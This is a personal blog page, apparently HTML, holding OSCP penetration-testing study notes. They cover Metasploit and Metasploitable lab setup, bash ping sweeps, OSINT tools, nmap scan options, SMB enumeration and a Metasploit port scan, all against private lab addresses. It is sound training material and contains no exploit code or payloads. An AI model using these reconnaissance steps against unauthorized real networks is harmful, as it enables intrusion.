KIOPTRIX</span><br><span class="line">                                      </span><br></pre></td></tr></table></figure>
<p>-L, –list=HOST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient &quot;\\\192.168.0.22\IPC$&quot;</span><br></pre></td></tr></table></figure>
<p>see Not enough ‘&#39; characters in service, just add more backslashes</p>
<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p>could also try nmap with smb scripts</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script &quot;smb-*&quot; 192.168.0.22</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/07/OSCP-Study-Notes-2021-03-07/">OSCP Study Notes - 2021/03/07</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/OSCP/">OSCP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="TRY-HARDER"><a href="#TRY-HARDER" class="headerlink" title="TRY HARDER!!"></a>TRY HARDER!!</h1><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents:"></a>Table of Contents:</h1><ul>
<li><a href="#Miscellaneous">Miscellaneous</a></li>
<li><a href="#Metasploit-Setup">Metasploit Setup</a><ul>
<li><a href="#Hypervisor-Setup">Hypervisor Setup</a></li>
</ul>
</li>
<li><a href="#METASPLOIT-FILESYSTEM-AND-LIBRARIES">Metasploit Filesystem and Libraries</a></li>
<li><a href="#Metasploit-Fundamentals">Metasploit Fundamentals</a></li>
<li><a href="#Commandline-refresher">Commandline Refresher</a></li>
<li><a href="#Kali-Services">Kali Services</a></li>
<li><a href="#Bash-scripting">Bash Scripting</a></li>
<li><a href="#Information-Gathering">Information Gathering</a></li>
<li><a href="#Scanning-with-nmap">Scanning with nmap</a></li>
<li><a href="#Scan-with-Metasploit">Scan with Metasploit</a></li>
<li><a href="#Kioptrix:-Level-1">Kioptrix: Level 1</a><h1 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h1>Zhihu Guide: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/71112837">如何拿到OSCP渗透测试认证</a><br>Start Date: <code>Sat, 13 Mar 2021, 19:00</code>  </li>
</ul>
<h1 id="Metasploit-Setup"><a href="#Metasploit-Setup" class="headerlink" title="Metasploit Setup"></a>Metasploit Setup</h1><p>Requirements: <a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/requirements/">METASPLOIT UNLEASHED REQUIREMENTS
</a></p>
<h2 id="Hypervisor-Setup"><a href="#Hypervisor-Setup" class="headerlink" title="Hypervisor Setup"></a>Hypervisor Setup</h2><ul>
<li>Download <a target="_blank" rel="noopener" href="https://www.vmware.com/products/workstation-player.html">VMware Player</a>  </li>
<li>Download <a target="_blank" rel="noopener" href="http://www.kali.org/downloads/">KALI LINUX</a></li>
<li>Download <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/metasploitable/files/latest/download">Metasploitable</a></li>
</ul>
<p>Direct Control back to host: <code>Alt</code>+<code>Ctl</code></p>
<h3 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h3><ul>
<li>RAM: 2GB</li>
<li>Disk 10GB</li>
<li>Username: gavin</li>
<li>PasswordTip: [cc6]</li>
<li>Update Metasploit: <code>apt update &amp;&amp; apt upgrade</code></li>
</ul>
<h3 id="MetaSploitable"><a href="#MetaSploitable" class="headerlink" title="MetaSploitable:"></a>MetaSploitable:</h3><ul>
<li>RAM: 512MB</li>
<li>login: msfadmin:msfadmin</li>
</ul>
<h1 id="Metasploit-Filesystem-and-Libraries"><a href="#Metasploit-Filesystem-and-Libraries" class="headerlink" title="Metasploit Filesystem and Libraries"></a>Metasploit Filesystem and Libraries</h1><p>Link: <a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/filesystem-and-libraries/">METASPLOIT FILESYSTEM AND LIBRARIES</a><br>Installed in Kali Linux by default<br>pacakge path: <code>/usr/share/metasploit-framework</code><br>DATA/DOCUMENTATION/LIB/MODULES/PLUBINS/SCRIPTS/TOOLS</p>
<p>Two Module Locations:  </p>
<ul>
<li>Primary Modules: <code>/usr/share/metasploit-framework/modules/</code></li>
<li>Custom Modules: <code>~/.msf4/modules/</code></li>
</ul>
<h2 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h2><ul>
<li><strong>Exploits</strong>: exploit modules are defined as modules that use payloads  </li>
<li><strong>Auxiliary</strong>: Auxiliary modules include port scanners, fuzzers, sniffers, and more.</li>
<li><strong>Payloads, Encoders, Nops</strong>: Payloads consist of code that runs remotely, while encoders ensure that payloads make it to their destination intact. Nops keep the payload sizes consistent across exploit attempts.</li>
</ul>
<h1 id="Metasploit-Fundamentals"><a href="#Metasploit-Fundamentals" class="headerlink" title="Metasploit Fundamentals"></a>Metasploit Fundamentals</h1><ul>
<li>start: <code>msfconsole</code></li>
<li><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">Commands</a></li>
</ul>
<h2 id="Payload-Type"><a href="#Payload-Type" class="headerlink" title="Payload Type"></a>Payload Type</h2><h3 id="Singles"><a href="#Singles" class="headerlink" title="Singles"></a>Singles</h3><p>Singles are payloads that are self-contained and completely standalone. A Single payload can be something as simple as adding a user to the target system or running calc.exe</p>
<h3 id="Stagers"><a href="#Stagers" class="headerlink" title="Stagers"></a>Stagers</h3><p>Stagers setup a network connection between the attacker and victim and are designed to be small and reliable. It is difficult to always do both of these well so the result is multiple similar stagers. Metasploit will use the best one when it can and fall back to a less-preferred one when necessary.</p>
<h3 id="Stages"><a href="#Stages" class="headerlink" title="Stages"></a>Stages</h3><p>Stages are payload components that are downloaded by Stagers modules. The various payload stages provide advanced features with no size limits such as Meterpreter, VNC Injection, and the iPhone ‘ipwn’ Shell.</p>
<h1 id="CommandLine-Refresher"><a href="#CommandLine-Refresher" class="headerlink" title="CommandLine Refresher"></a>CommandLine Refresher</h1><p>pwd, man, ls, cd, mkdir, rmdir, cp, mv, <strong>locate(find file)</strong>, adduser, su, sudo, echo, cat, nano, chmod, ifconfig, ping  </p>
<p><code>adduser bob sudo</code> create bob as sudo user</p>
<h1 id="Kali-Services"><a href="#Kali-Services" class="headerlink" title="Kali Services:"></a>Kali Services:</h1><p>http, ssh, postgresql</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p><code>service apache2 start</code><br><code>systemctl enable apache2</code><br><code>service apache2 stop</code>  </p>
<h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p><code>netstat -antp</code><br>-a, –all                display all sockets (default: connected)<br>-n, –numeric            don’t resolve names<br>-t –tcp<br>-p, –programs           display PID/Program name for sockets (permission relatied)  </p>
<h2 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h2><p>enable postgresql will make msfconsole search more quickly (can not feel it)</p>
<h1 id="Bash-Scripting"><a href="#Bash-Scripting" class="headerlink" title="Bash Scripting"></a>Bash Scripting</h1><p><code>ping -c 1 192.168.119.2 | grep &quot;64 bytes&quot; | cut -d &quot; &quot; -f 4 | sed &#39;s/.$//&#39;</code><br>-d, –delimiter=DELIM   use DELIM instead of TAB for field delimiter<br>-f, –fields=LIST       select only these fields;  also print any line that contains no delimiter character, unless the -s option is specified</p>
<p><code>sed &#39;s/.$//&#39;</code><br>The “.” (dot) indicates any character in sed, and the “$” indicates the end of the line. In other words “.$” means, delete the last character only.</p>
<p>ping all responed IP in the network: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> == <span class="string">&quot;&quot;</span> ] <span class="comment"># space after [</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Usage: ./ping_script.sh [network]&quot;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Example: ./ping_script.sh 192.168.119&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">for</span> ip <span class="keyword">in</span> `seq 1 254`; <span class="keyword">do</span> </span><br><span class="line">		ping -c 1 <span class="variable">$1</span>.<span class="variable">$ip</span> | grep <span class="string">&quot;64 bytes&quot;</span> \</span><br><span class="line">		| cut -d <span class="string">&quot; &quot;</span> -f 4 | sed <span class="string">&#x27;s/.$//&#x27;</span> &amp;</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./pingsweep.sh &gt; iplist.txt</span><br><span class="line">cat iplist.txt | sort -u</span><br></pre></td></tr></table></figure>
<p>-u show only unique results</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(cat iplist.txt); do nmap -Pn $ip; done</span><br></pre></td></tr></table></figure>
<p>nmap:<br>-Pn: Treat all hosts as online – skip host discovery  </p>
<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools:"></a>Tools:</h2><p>Google, Exploit-DB, Google Hacking DB, WHOIS, Netcraft, theharvester</p>
<h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><p><code>site:cnn.com  -site:www.cnn.com filetype:pdf </code><br><code>showdan</code>  devices connect to internet</p>
<h2 id="Netcraft"><a href="#Netcraft" class="headerlink" title="Netcraft"></a>Netcraft</h2><p>Search web by domain <a target="_blank" rel="noopener" href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a> <code>*.cnn.com</code></p>
<h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p>looking for domain information <code>whois cnn.com</code></p>
<h2 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h2><p><code>theHarvester -d cnn.com -b google -l 200</code><br>-d domain<br>-b datasource (e.g. bing, linkedin, google)<br>-l limit the number of results</p>
<p><code>nc -nv xxx.xxx.xxx.xxx &lt;port&gt;</code><br>-n                      numeric-only IP addresses, no DNS<br>-v                      verbose [use twice to be more verbose]  </p>
<h1 id="Scanning-with-nmap"><a href="#Scanning-with-nmap" class="headerlink" title="Scanning with nmap"></a>Scanning with nmap</h1><p>pingsweep, but not quite accurate, false postive</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.119.1-254</span><br><span class="line">nmap -sn 192.168.119.0/24</span><br></pre></td></tr></table></figure>
<p>-sn: Ping Scan - disable port scan</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -vv -Pn -A -sS -T4 -p- -oN tcpscan.txt 192.168.119.129</span><br></pre></td></tr></table></figure>
<p>-A: Enable OS detection, version detection, script scanning, and traceroute<br>-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans<br><strong>use sS to avoid triggering fireware, SEND, ACK, instead of ACK back, send RST(reset))</strong><br>-T&lt;0-5&gt;: Set timing template (higher is faster) <strong>may be get detected when set high, in real world, T4 seems fine</strong><br>-p &lt;port ranges&gt;: Only scan specified ports<br>Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9<br>-p- (all)<br>-oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIptkIddi3,and Grepable format, respectively, to the given filename.  </p>
<p><strong>Speedup tips: quickly scan for open ports, then do -A on open ports to gather more info</strong></p>
<h2 id="UDP-scan"><a href="#UDP-scan" class="headerlink" title="UDP scan"></a>UDP scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -vv -Pn -A -sU -T4 --top-ports 200 -oN udpscan.txt 192.168.119.129</span><br></pre></td></tr></table></figure>
<p>–top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports </p>
<p><strong>Again, two stage scans, very useful, save time</strong></p>
<h2 id="nmap-script-engining"><a href="#nmap-script-engining" class="headerlink" title="nmap script engining"></a>nmap script engining</h2><p>script stored at <code>/usr/share/nmap/scrips</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -vv -p 137 --script&#x3D;all 192.168.119.129</span><br></pre></td></tr></table></figure>

<h1 id="Scan-with-Metasploit"><a href="#Scan-with-Metasploit" class="headerlink" title="Scan with Metasploit"></a>Scan with Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search portscan</span><br><span class="line"></span><br><span class="line">## enter module:</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line">## change options, case insensitive</span><br><span class="line">set ports 1-65535</span><br><span class="line">set rhost 192.169.119.129</span><br><span class="line">set threads 10</span><br><span class="line"></span><br><span class="line">## run it</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix: Level 1"></a>Kioptrix: Level 1</h1><p>Download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a></p>
<h2 id="Walk-Through"><a href="#Walk-Through" class="headerlink" title="Walk Through"></a>Walk Through</h2><a href="/2021/03/08/Kioptrix-Level-1-Walkthrough/" title="Kioptrix Level 1 Walkthrough">Kioptrix Level 1 Walkthrough</a></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/07/hello-world/">Hello World</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-07</time><div class="content"><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<h3 id="Clone-Notes"><a href="#Clone-Notes" class="headerlink" title="Clone Notes:"></a>Clone Notes:</h3><p>Source Code Branch: <code>source</code><br>Deploy Branch: <code>Master</code> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b <span class="built_in">source</span> git@github.com:Gavincrz/gavincrz.github.io.git</span><br><span class="line"><span class="built_in">cd</span> gavincrz.github.io</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>


</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>